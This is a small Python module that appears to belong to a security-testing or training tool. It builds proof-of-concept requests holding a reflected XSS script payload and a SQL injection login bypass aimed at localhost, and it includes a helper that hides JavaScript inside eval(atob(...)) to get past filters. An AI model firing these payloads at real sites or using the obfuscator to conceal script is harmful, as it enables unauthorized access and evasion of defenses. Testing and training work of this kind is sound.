# modules/poc.py
import random
import base64

def generate_poc(typ="xss", target="http://127.0.0.1"):
    if typ == "xss":
        payload = "<script>alert('XSS from TryHuntMe')</script>"
        return f"GET {target}/search?q={payload}"
    elif typ == "sqli":
        payload = "' OR '1'='1' -- "
        return f"POST {target}/login with body: username=admin&password={payload}"
    else:
        return "// unsupported type"

def obfuscate_js(payload):
    # very simple JS payload obfuscator: base64 encode inside eval
    b = base64.b64encode(payload.encode()).decode()
    return f"eval(atob('{b}'))"
